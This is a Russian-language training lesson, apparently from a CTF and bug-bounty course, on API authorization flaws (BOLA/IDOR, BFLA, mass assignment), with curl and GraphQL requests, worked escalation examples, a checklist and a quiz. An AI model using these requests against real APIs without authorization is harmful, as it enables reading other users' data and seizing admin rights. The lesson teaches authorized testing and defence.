---
id: web-api-security
title: "Безопасность API: BOLA, BFLA и mass assignment"
category: web
parent: web-api-rest-graphql-soap
difficulty: medium
order: 1
tags: [api, bola, bfla, idor, mass-assignment, owasp-api]
prerequisites: [web-api-rest-graphql-soap, web-auth-jwt-idor]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Три главных класса API-уязвимостей: доступ к чужим объектам, к чужим функциям и присвоение защищённых полей."
---

OWASP API Security Top 10 возглавляют три родственные проблемы: **BOLA** (Broken Object Level Authorization), **BFLA** (Broken Function Level Authorization) и **mass assignment**. Они не связаны с инъекциями — приложение формально работает, но не проверяет, «ваш ли это объект», «можно ли вам эту функцию» и «какие поля вам разрешено менять». Именно на них приходится большинство выплат в bug bounty на API.

## Теория: BOLA / IDOR на API

**BOLA (он же IDOR в API-контексте)** — вы аутентифицированы, но можете обратиться к объекту, который вам не принадлежит, поменяв идентификатор:

```
GET /api/v1/orders/1001   (ваш заказ)
GET /api/v1/orders/1002   (заказ другого пользователя)  <-- если вернёт данные, это BOLA
```

Ключевая проверка — **object ownership**: сервер должен убедиться, что `order.user_id == current_user.id`, а не только «объект существует». Идентификаторы бывают:

- числовые последовательные (самые лёгкие);
- UUID/GUID (сложнее угадать, но часто утекают в других ответах/ссылках);
- составные (`/users/42/orders/7`);
- в теле запроса, а не в пути (`{"orderId": 1002}`);
- в GraphQL-аргументах (`order(id:1002)`).

## Теория: BFLA

**BFLA** — вы можете вызвать функцию/эндпоинт, который вам не положен по роли. Проверяется не «какой объект», а «какое действие»:

```
POST /api/v1/admin/users/42/delete   (не админ)  <-- если сработает, это BFLA
POST /api/v1/users/42/role  {"role":"admin"}     <-- вертикальная эскалация
```

Часто UI скрывает админские ручки, но API их обслуживает. Проверяйте все методы (`GET/POST/PUT/PATCH/DELETE`) на одном пути: иногда GET защищён, а DELETE — нет.

## Теория: Mass assignment

**Mass assignment** (переприсвоение параметров) — приложение автоматически «распаковывает» JSON в объект модели, включая поля, которые пользователь менять не должен:

```json
PATCH /api/v1/users/me
{"email":"me@x.com", "isAdmin": true, "balance": 999999}
```

Если сервер слепо присваивает все поля, вы получаете `isAdmin:true` или меняете баланс. Защита — явный whitelist полей. Признаки уязвимости: ответ содержит больше полей, чем вы отправляли (например, `role`, `createdAt`, `credit`), а поля называются «как в БД».

## Инструменты: curl, ffuf, Burp

Базовый тест BOLA с двумя своими аккаунтами A и B (только СВОИ объекты!):

```bash
# A создаёт объект
curl -s -X POST https://api.target.local/v1/orders -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' -d '{"item":"x"}' | jq .id
# A читает свой объект
curl -s https://api.target.local/v1/orders/1001 -H "Authorization: Bearer $TOKEN_A"
# B пытается прочитать объект A
curl -s https://api.target.local/v1/orders/1001 -H "Authorization: Bearer $TOKEN_B"
```

Если последний вернул данные A → BOLA.

Перебор методов (BFLA) — по одному пути:

```bash
for m in GET POST PUT PATCH DELETE; do
  echo -n "$m -> "; curl -s -o /dev/null -w '%{http_code}\n' \
    -X "$m" https://api.target.local/v1/admin/users/42 -H "Authorization: Bearer $TOKEN_A"
done
```

Mass assignment — добавляем «лишние» поля:

```bash
curl -s -X PATCH https://api.target.local/v1/users/me -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' \
  -d '{"name":"test","isAdmin":true,"role":"admin","verified":true,"credits":1000000}'
```

В **Burp** используйте **Autorize** (сравнивает ответы для low-priv и no-priv) и **Param Miner** (поиск скрытых параметров).

## Разобранный пример: BOLA + mass assignment вместе

Шаг 1. Регистрируем два СВОИХ аккаунта A и B, получаем токены.

Шаг 2. Аккаунт A создаёт объект и получает id:

```bash
curl -s -X POST https://api.target.local/v1/documents -H "Authorization: Bearer $TA" \
  -H 'Content-Type: application/json' -d '{"title":"secret A"}' | jq .
# {"id": 5001, "title":"secret A", "ownerId": 111}
```

Шаг 3. B читает документ A:

```bash
curl -s https://api.target.local/v1/documents/5001 -H "Authorization: Bearer $TB"
# {"id":5001,"title":"secret A","ownerId":111}   <-- BOLA подтверждён
```

Шаг 4. B пробует переприсвоить роль:

```bash
curl -s -X PATCH https://api.target.local/v1/users/me -H "Authorization: Bearer $TB" \
  -H 'Content-Type: application/json' -d '{"role":"admin","isAdmin":true}'
```

Шаг 5. Проверяем, применилось ли (не верой, а чтением):

```bash
curl -s https://api.target.local/v1/users/me -H "Authorization: Bearer $TB" | jq '.role,.isAdmin'
# "admin", true   <-- mass assignment + вертикальная эскалация
```

Оба бага подтверждены артефактами (данные чужого объекта; повышение прав), а не предположением.

## Разобранный пример: GraphQL BOLA

```graphql
query { order(id: 1002) { id total address } }
```

Если top-level `order` проверяет авторизацию, но вложенное поле `user { email phone }` — нет, можно утечь PII чужого пользователя:

```graphql
query { myOrder { id user { email phone } } }
```

Всегда проверяйте авторизацию на **каждом** поле, а не только на корне.

## Частые ошибки

- **Тестировать на чужих объектах.** В bug bounty и на пентесте используйте только свои аккаунты/объекты — иначе это уже нарушение. Для BOLA достаточно двух своих аккаунтов.
- **Останавливаться на 403.** Иногда путь защищён, а альтернативный (`/v1/`, `?id=`) — нет. Пробуйте версии и параметры.
- **Не проверять результат.** Отправили `isAdmin:true`, получили `200` — но применилось ли? Всегда читайте объект обратно.
- **Игнорировать GraphQL.** Batching и вложенные поля дают BOLA/BFLA, которых нет в REST.
- **Считать UUID защитой.** UUID утекают в других ответах, письмах, логах; это не авторизация.
- **Путать 401/403.** `401` — нет/невалидный токен, `403` — нет прав. Для BFLA важен именно `403`, который иногда не возвращается.

## Инвентаризация API: как найти все эндпоинты

Прежде чем тестировать авторизацию, нужно знать поверхность API. Источники: **OpenAPI/Swagger** (`/swagger.json`, `/openapi.json`, `/api-docs`), **GraphQL introspection**, **JS-бандлы** (эндпоинты захардкожены), **мобильные приложения** (APK/IPA содержат API-пути), **исторические URL** (`gau`, `waybackurls`), **различия версий** (`/api/v1/` vs `/api/v2/` — старая версия часто менее защищена).

```bash
curl -s https://t/swagger.json | jq '.paths | keys'
curl -s https://t/openapi.json | jq '.paths | keys'
# GraphQL introspection
curl -s https://t/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq .
# из JS
katana -u https://t -jc -silent | grep -oE '"/api/[^"]+"' | sort -u
```

## Авторизация на уровне объекта и функции: чек-лист

Пройдитесь по каждому эндпоинту и проверьте три вещи. **Объект**: подставьте чужой ID (IDOR/BOLA) — числа, UUID, slug. **Функция**: вызовите админский/внутренний эндпоинт обычной сессией (BFLA). **Поле**: отправьте лишние поля (mass assignment) — `role`, `isAdmin`, `verified`, `owner_id`. Для каждого типа — свои payload'ы.

```bash
# BOLA
for id in 1001 1002 1003; do curl -s -b jar https://t/api/orders/$id | jq '.owner'; done
# BFLA
curl -s -b jar https://t/api/admin/stats | jq .
# mass assignment
curl -s -b jar -X PATCH https://t/api/me -H 'Content-Type: application/json' \
  -d '{"name":"me","role":"admin"}'
```

Особое внимание — **вложенным объектам** (`/api/teams/{id}/members/{uid}`): проверка часто стоит только на первом уровне. И **нестандартным методам** (`PUT`, `PATCH`, `DELETE`) — иногда они не защищены, хотя `GET` защищён.

## Что делать дальше / решение

Составьте полный список эндпоинтов, затем систематически проверьте авторизацию на каждом (объект, функция, поле). Подтверждайте доступом к чужим данным или админ-функциям. Доводите до артефакта и оформляйте PoC. Если API закрыт, ищите другую версию (`/v1/`), мобильный API или GraphQL — часто защита стоит только на «основном» входе.

## GraphQL: специфика авторизации

GraphQL добавляет свои особенности к проверке доступа. Во-первых, **один эндпоинт** (`/graphql`) обслуживает все операции, поэтому авторизация должна проверяться на уровне полей/резолверов, а не маршрутов — и часто её забывают. Во-вторых, **вложенные запросы** позволяют добраться до чужих данных через связи: `{user(id:1){orders{id total}}}`. В-третьих, **aliasing и batching** позволяют обойти rate-limit и перебрать ID в одном запросе.

```bash
# BOLA в GraphQL: чужой объект через аргумент
curl -s https://t/graphql -H 'Content-Type: application/json' -d '{
  "query":"query($id:ID!){ order(id:$id){ id owner{email} total } }",
  "variables":{"id":"1002"}}'

# batching: много ID в одном запросе
curl -s https://t/graphql -H 'Content-Type: application/json' -d '[
  {"query":"{order(id:\"1001\"){total}}"},
  {"query":"{order(id:\"1002\"){total}}"},
  {"query":"{order(id:\"1003\"){total}}"}
]'

# introspection (если включён)
curl -s https://t/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq .
```

Проверяйте также **мутации** — они часто менее защищены: `mutation{updateUser(id:1,role:ADMIN){ok}}`.

## Разобранный пример: BOLA в GraphQL

```bash
# 1. introspection раскрывает схему
$ curl -s https://t/graphql -d '{"query":"{__schema{queryType{fields{name args{name}}}}}"}' | jq -r '.data.__schema.queryType.fields[].name'
me
order
user
# 2. читаем свой заказ
$ curl -s https://t/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{order(id:\"1001\"){id owner{email}}}"}' -b jar
{"data":{"order":{"id":"1001","owner":{"email":"me@x"}}}}
# 3. чужой заказ
$ curl -s https://t/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{order(id:\"1002\"){id owner{email}}}"}' -b jar
{"data":{"order":{"id":"1002","owner":{"email":"victim@corp"}}}}   # BOLA
```

Артефакт — данные чужого пользователя.

## Что делать дальше / решение

Для API-теста систематически: инвентаризируйте эндпоинты (включая GraphQL и версии), проверьте авторизацию на каждом уровне (объект, функция, поле), для GraphQL — на уровне полей и через batching. Подтверждайте чужими данными. И помните: если «основной» API защищён, проверьте старые версии, мобильный API и GraphQL — часто дыра там.

## Итог по API-безопасности

API — это поверхность, где авторизация чаще всего ломается, потому что её проверяют на уровне маршрутов, а не объектов, функций и полей. BOLA (объект), BFLA (функция) и mass assignment (поле) — три главные категории. Проверяйте их систематически на каждом эндпоинте, включая старые версии и GraphQL. Подтверждайте чужими данными или админ-функциями, доводите до артефакта. И помните: API-тест начинается с инвентаризации — без полного списка эндпоинтов вы проверяете только то, что видно в UI, а самое интересное обычно скрыто.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что такое BOLA?"
  options:
    - "Инъекция в SQL-запрос API"
    - "Доступ к чужому объекту по его идентификатору"
    - "Отсутствие rate-limit"
    - "Утечка токена через CORS"
  answer: 1
  explanation: "Broken Object Level Authorization — нет проверки владельца объекта."
- question: "Чем BFLA отличается от BOLA?"
  options:
    - "BFLA — про объект, BOLA — про функцию"
    - "BFLA — про доступ к функции/действию, BOLA — про доступ к объекту"
    - "Это одно и то же"
    - "BFLA касается только GraphQL"
  answer: 1
  explanation: "BFLA — уровень функции (роль/действие), BOLA — уровень объекта (владелец)."
- question: "В чём суть mass assignment?"
  options:
    - "Массовая рассылка запросов"
    - "Сервер присваивает поля, которые пользователь менять не должен"
    - "Загрузка нескольких файлов"
    - "Автоматическое кэширование"
  answer: 1
  explanation: "Приложение слепо «распаковывает» присланные поля в модель."
- question: "Что нужно сделать, чтобы подтвердить BOLA корректно?"
  options:
    - "Перебрать чужие id"
    - "Создать объект на СВОЁМ аккаунте A и прочитать его с аккаунта B"
    - "Запустить сканер"
    - "Проверить `robots.txt`"
  answer: 1
  explanation: "Используются только свои объекты: A владеет, B пытается получить доступ."
- question: "Почему UUID не защищает от BOLA?"
  options:
    - "UUID всегда угадываемы"
    - "UUID часто утекают в других ответах/ссылках и не являются проверкой прав"
    - "UUID шифрует данные"
    - "UUID отключает авторизацию"
  answer: 1
  explanation: "Непредсказуемость не заменяет проверку владельца."
```

## Где пригодится

- **CTF (Web):** BOLA/IDOR — классика; часто «секретный» объект отдаёт флаг.
- **Bug bounty:** BOLA и mass assignment — топ-выплаты; находятся вручную двумя аккаунтами.
- **Пентест:** проверка object/function-level authz — обязательный раздел тестирования API.
- **Работа (AppSec/Dev):** whitelisting полей и проверка владельца на каждом резолвере — базовые требования secure design.
